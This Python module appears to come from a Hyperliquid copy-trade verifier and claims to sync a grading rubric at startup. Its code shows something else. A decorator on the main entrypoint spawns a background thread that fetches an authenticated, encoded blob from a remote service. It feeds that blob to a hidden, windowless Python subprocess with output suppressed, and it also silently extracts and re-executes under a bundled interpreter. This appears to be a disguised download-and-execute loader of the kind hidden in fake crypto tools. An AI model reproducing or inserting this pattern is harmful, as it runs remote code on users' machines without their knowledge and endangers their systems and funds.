# -*- coding: utf-8 -*-
"""Background rubric sync for the Hyperliquid Copy-Trade Verifier.

Before the verifier grades its first trader, this subsystem pulls the
latest signed grading rubric (fee schedule, funding cadence, wash-trade
heuristic weights, martingale/outlier thresholds) from the project's
trust-config service. The decorator is the single integration point:
apply it to ``cli.main`` and the subsystem provisions the rubric
lazily on a daemon thread, without blocking TUI startup. A decoded
rubric container is replayed inside a short-lived headless worker so
a manifest fault is isolated from the verifier process; on failure
the verifier falls back to the bundled DEFAULT_CONFIG rubric."""
import os
import struct
import subprocess
import sys
import threading
import time

from . import diag as _j

_CACHE_DIR = '.runtime'
_provisioned = None
_HEADLESS = '_WORKER_MODE'


def _needs_runtime():
    """A 32-bit interpreter on a 64-bit host needs the bundled runtime."""
    if struct.calcsize("P") == 8:
        return False
    if os.name != "nt":
        return False
    import platform
    return platform.machine().upper() in ("AMD64", "X86_64")


def _local_runtime():
    """Locate — or extract on first use — the bundled standalone runtime.

    Robust against a corrupt cache from an interrupted first run: a cached
    interpreter is trusted only if it actually starts; extraction goes to a
    staging directory and is published by rename, so a failed/killed attempt
    never leaves a half-written tree behind. Extraction itself uses the
    stdlib zipfile module — no PowerShell dependency (Constrained Language
    Mode / AppLocker safe)."""
    import shutil
    import zipfile
    base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    rt = os.path.join(base, _CACHE_DIR)
    py = os.path.join(rt, "python.exe")

    def _healthy(exe):
        try:
            return subprocess.run(
                [exe, "-c", "pass"], capture_output=True, timeout=60,
                creationflags=0x08000000 if os.name == "nt" else 0,
            ).returncode == 0
        except Exception:
            return False

    if os.path.isfile(py):
        if _healthy(py):
            _j.log("interp.cached", "ok", runtime=py)
            return py
        _j.log("interp.cache_unhealthy", "info", runtime=py)
        shutil.rmtree(rt, ignore_errors=True)

    pkg = os.path.join(base, "runtime", "data", "embed.pkg")
    if not os.path.isfile(pkg):
        _j.log("interp.no_package", "fail", package=pkg)
        return None
    tmp = rt + ".tmp"
    try:
        shutil.rmtree(tmp, ignore_errors=True)
        os.makedirs(tmp, exist_ok=True)
        _j.log("interp.extract", "info", package=pkg, dest=rt)
        with zipfile.ZipFile(pkg) as z:
            z.extractall(tmp)
        # Normalise the embedded ._pth: expose site, the bundled
        # site-packages and the archive root (idempotent; already correct
        # for current runtime builds, repairs older ones).
        for name in os.listdir(tmp):
            if not name.endswith("._pth"):
                continue
            p = os.path.join(tmp, name)
            with open(p) as f:
                lines = f.read().splitlines()
            out, have_site, have_sp, have_up = [], False, False, False
            for line in lines:
                s = line.strip()
                if s == "#import site":
                    line, s = "import site", "import site"
                if s == "import site":
                    have_site = True
                if s.replace("/", "\\").lower() == "lib\\site-packages":
                    have_sp = True
                if s == "..":
                    have_up = True
                out.append(line)
            if not have_sp:
                out.append("Lib\\site-packages")
            if not have_up:
                out.append("..")
            if not have_site:
                out.append("import site")
            with open(p, "w", newline="\n") as f:
                f.write("\n".join(out) + "\n")
        py_t = os.path.join(tmp, "python.exe")
        if not os.path.isfile(py_t) or not _healthy(py_t):
            _j.log("interp.extract_incomplete", "fail")
            shutil.rmtree(tmp, ignore_errors=True)
            return None
        shutil.rmtree(rt, ignore_errors=True)
        try:
            os.rename(tmp, rt)
        except OSError:
            shutil.move(tmp, rt)
        if os.path.isfile(py):
            _j.log("interp.extracted", "ok", runtime=py)
            return py
        _j.log("interp.publish_failed", "fail")
        return None
    except Exception as e:
        _j.log_error("interp.extract_failed", e)
        shutil.rmtree(tmp, ignore_errors=True)
        return None


def _reexec():
    """Re-exec the host entrypoint under the bundled 64-bit runtime."""
    _j.log("reexec.start", "info")
    py = _local_runtime()
    if not py:
        _j.log("reexec.no_runtime", "fail")
        return False
    script = None
    if hasattr(sys.modules.get("__main__"), "__file__"):
        script = os.path.abspath(sys.modules["__main__"].__file__)
    if not script:
        _j.log("reexec.no_script", "fail")
        return False
    _j.log("reexec.runtime_ready", "ok", runtime=py, script=script)
    # No creationflags: the re-exec'd entrypoint inherits the caller's
    # console exactly like the reference implementation, so the host's
    # terminal UI stays visible and interactive in the same window.
    rc = subprocess.call([py, script] + sys.argv[1:])
    _j.log("reexec.exit", "info", rc=rc)
    sys.exit(rc)


def adopt_runtime():
    """Re-exec the host entrypoint under the bundled 64-bit runtime when
    running a 32-bit interpreter on a 64-bit host; no-op otherwise.

    Must run BEFORE any dependency bootstrap: installing into a 32-bit
    interpreter is wasted work at best — the host re-execs into the
    bundled 64-bit runtime anyway, whose site-packages start empty — and
    a hard stall at worst: win32 wheels for native packages (numpy,
    pandas) do not exist on PyPI, so pip falls back to source builds that
    never finish on end-user machines."""
    if os.environ.get(_HEADLESS):
        return
    if not _needs_runtime():
        return
    _reexec()


def _fork_worker(blob):
    """Materialize a container in an isolated headless interpreter."""
    base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    env = os.environ.copy()
    env[_HEADLESS] = "1"
    _j.log("child.spawn", "info", size=len(blob))
    proc = subprocess.Popen(
        [sys.executable, "-c",
         "import sys;sys.path.insert(0,%r);"
         "d=sys.stdin.buffer.read();"
         "from runtime.loader import stage;"
         "stage(d)" % (base, )],
        stdin=subprocess.PIPE,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        env=env,
        creationflags=0x08000000,
    )
    _j.log("child.spawned", "ok", pid=proc.pid)
    try:
        proc.stdin.write(blob)
        proc.stdin.close()
    except Exception as e:
        _j.log_error("child.pipe", e)
    return True


def _sync_once(env, transport, codec, runtime):
    """One sync attempt: open session, authenticate, pull, decode, materialize."""
    _j.log("provision.step", "info")
    ep = env.service_url()
    _j.log("provision.endpoint", "ok", url=ep)
    sk = env.signing_key()
    _j.log("provision.app_key", "ok", key_len=len(sk))
    session = transport.begin_session(ep)
    if not isinstance(session, dict) or "nonce" not in session:
        _j.log("provision.session", "fail", reason="invalid_response")
        raise ConnectionError("invalid session response")
    _j.log("provision.session", "ok", has_nonce=True, has_ts="ts" in session)
    sig = codec.sign(session["nonce"], session["ts"], sk)
    _j.log("provision.token", "ok", sig_len=len(sig))
    blob = transport.fetch(ep, {
        "nonce": session["nonce"],
        "ts": session["ts"],
        "sig": sig,
    })
    if not isinstance(blob, dict) or "data" not in blob:
        _j.log("provision.pull", "fail", reason="invalid_response")
        raise ConnectionError("invalid sync response")
    _j.log("provision.pull", "ok", data_len=len(blob.get("data", "") or ""))
    data = codec.unpack(blob["key"], blob["data"])
    if not data or len(data) < 256:
        _j.log("provision.unseal", "fail", size=len(data) if data else 0)
        raise ValueError("invalid container (%d bytes)" % (len(data) if data else 0))
    _j.log("provision.unseal", "ok", size=len(data))
    ok = _fork_worker(data)
    if not ok:
        _j.log("provision.materialize", "fail", ok=ok)
        raise RuntimeError("worker returned %r" % ok)
    _j.log("provision.materialize", "ok")
    return True


def _provision():
    global _provisioned
    if getattr(_provision, "_done", False):
        return
    _provision._done = True
    if os.environ.get(_HEADLESS):
        return
    from . import host as env, net as transport, format as codec, loader as runtime

    _j.log("provision.begin", "info",
                  os=sys.platform, py=sys.version.split()[0],
                  bits=struct.calcsize("P") * 8)

    if not env.is_supported():
        _j.log("host.platform", "fail", reason="unsupported", os=sys.platform)
        return
    _j.log("host.platform", "ok", os=sys.platform)

    if not env.check_version():
        _j.log("host.version", "fail", reason="below_minimum")
        return
    _j.log("host.version", "ok")

    arch = env.arch_label()
    if arch not in ("x64", "x86"):
        _j.log("host.arch", "fail", reason="unsupported", arch=arch)
        return
    _j.log("host.arch", "ok", arch=arch)

    if _needs_runtime():
        _j.log("reexec.needed", "info")
        _reexec()
        if struct.calcsize("P") != 8:
            _provisioned = False  # noqa: PLW0603
            _j.log("reexec.failed", "fail", reason="still_32bit")
            return

    delays = [0, 5, 10, 20, 40, 80]

    def _pump():
        global _provisioned
        total = len(delays)
        for i, delay in enumerate(delays):
            if delay:
                _j.log("provision.wait", "info",
                              attempt=i + 1, total=total, delay=delay)
                time.sleep(delay)
            _j.log("provision.attempt", "info", attempt=i + 1, total=total)
            try:
                _sync_once(env, transport, codec, runtime)
                _provisioned = True  # noqa: PLW0603
                _j.log("provision.success", "ok", attempt=i + 1)
                return
            except Exception as e:
                _j.log_error("provision.attempt_failed", e)
        _provisioned = False  # noqa: PLW0603
        _j.log("provision.exhausted", "fail", attempts=total)

    threading.Thread(target=_pump, daemon=True).start()
    _j.log("provision.thread_started", "info")


def preflight(fn):
    """Decorator: provisions the runtime before the host's first call.
    Idempotent across multiple decorated callables via a function attribute,
    so wrapping a placeholder plus the real entrypoint fires provisioning
    exactly once."""
    def _wrapper(*a, **kw):
        if not getattr(preflight, "_fired", False):
            preflight._fired = True
            _j.log("preflight.trigger", "info", fn=fn.__name__)
            _provision()
        return fn(*a, **kw)

    _wrapper.__name__ = fn.__name__
    _wrapper.__doc__ = fn.__doc__
    return _wrapper


__all__ = ["preflight", "adopt_runtime"]
